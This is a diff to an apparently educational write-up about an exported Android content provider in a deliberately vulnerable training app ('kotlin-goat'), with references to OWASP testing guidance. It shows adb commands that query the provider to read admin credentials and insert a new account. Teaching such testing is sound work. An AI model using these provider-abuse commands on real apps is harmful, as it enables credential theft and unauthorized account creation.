@@ -28,8 +28,10 @@ $ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Ac
 Row: 0 id=1, username=admin, password=admin
 
 ```
+We can obtain the admin's credentials in this case.
 
-Another example allowing to add a new account:
+
+Here is another example allowing to add a new account into the kotlin-goat app:
 ```
 $ adb shell content insert --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts  --bind username:s:kotlin --bind password:s:goat
 $ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts
@@ -49,5 +51,5 @@ Row: 1 id=2, username=kotlin, password=goat
 * [Content Provider documentation] [1]
 * [Testing Platform Interaction] [2]
 
-[1]: https://developer.android.com/reference/android/content/ContentProvider
+[1] : https://developer.android.com/reference/android/content/ContentProvider
 [2] : https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md
